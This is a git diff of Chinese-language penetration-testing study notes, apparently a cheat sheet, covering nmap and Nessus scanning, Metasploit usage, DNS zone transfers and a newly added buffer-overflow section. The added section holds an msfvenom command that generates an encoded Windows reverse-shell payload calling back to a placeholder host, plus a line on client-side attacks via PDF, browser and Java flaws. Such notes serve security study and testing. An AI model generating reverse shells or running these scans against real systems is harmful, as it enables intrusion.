@@ -11,8 +11,8 @@ pwd, man, ls, cd, mkdir, rmdir, cp, mv, locate, adduser, su, sudo, echo, cat, vi
 ## 常用服务  
 apache2, ssh, postgresql
 
-root@kali:/# service apache2 start  
-root@kali:/# systemctl enable apache2  
+service apache2 start  
+systemctl enable apache2  
 
 
 ## 信息收集  
@@ -30,16 +30,16 @@ TCP vs UDP
 ### Nmap  
 > 选项：-vv详细，-Pn不论是否存活一律扫描，-A综合扫描，-sS SYN扫描，-sU UDP扫描，-T4扫描速度（1慢，5快），-p指定端口，-p-所有端口，-oN输出格式，--script使用脚本扫描  
 
-root@kali:/# nmap -vv -Pn -A -sS -T4 -p- -oN /root/tcpscan.txt 192.168.1.101      # TCP SYN扫描      
-root@kali:/# nmap -vv -Pn -A -sU -T4 -top-ports 200 -oN /root/udpscan.txt 192.168.1.101         # UDP扫描  
-root@kali:/# nmap -vv -p 137 --script=all 192.168.1.101                # 对137端口跑脚本  
+nmap -vv -Pn -A -sS -T4 -p- -oN /root/tcpscan.txt 192.168.1.101                  # TCP SYN扫描      
+nmap -vv -Pn -A -sU -T4 -top-ports 200 -oN /root/udpscan.txt 192.168.1.101          # UDP扫描  
+nmap -vv -p 137 --script=all 192.168.1.101                                    # 对137端口跑脚本  
 
 ### Nessus  
-root@kali:/Downloads# dpkg -i <Nessus安装包\>.deb     # 安装  
-root@kali:/Downloads# /etc/init.d/nessusd start     # 启动  
+dpkg -i <Nessus安装包\>.deb     # 安装  
+/etc/init.d/nessusd start     # 启动  
 
 ### Metasploit  
-root@kali:/# msfconsole     # 启动msf  
+msfconsole     # 启动msf  
 msf> search portscan        # 查找模块  
 msf> use auxilary/...       # 使用  
 msf> show options           # 查看模块信息  
@@ -68,7 +68,40 @@ nbtscan
 smbclient  
 
 ### DNS枚举  
-root@kali:/# host [-t [ns|mx]] zonetransfer.me  
-root@kali:/# host -l <url> <ns>     # DNS Zone Transfer  
-root@kali:/# dnsrecon  
-root@kali:/# dnsenum  
+host [-t [ns|mx]] zonetransfer.me  
+host -l <url> <ns>     # DNS Zone Transfer  
+dnsrecon  
+dnsenum  
+
+
+
+## 栈溢出（Buffer Overflow）
+
+        |--------|      |---------|    
+        |  Text  |      |   ESP   |
+        |--------|      |---------|
+        |  Data  |      |  Buffer | 
+        |--------|      |    ↓    |
+        |  Heap  |      |         |
+        |   ↓    |   /  |---------|
+        |        |  /   |   EBP   |         
+        |--------| /    |---------|
+        |        |      |   EIP   |
+        |   ↑    |      |---------|
+        | Stack  |      |   arg2  |
+        |--------| \    |---------|
+        | Kernel |  \   |   arg1  |
+        |--------|   \  |---------|
+
+查找坏字符/不可用字符  
+
+生成shellcode：  
+msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=4444 EXITFUNC=thread -a x86 --platform windows -e x86/shikata_ga_nai -f python  
+
+
+
+## 客户端攻击  
+
+通过PDF、浏览器、Java Applet漏洞攻击，结合社工工具setool  
+
+
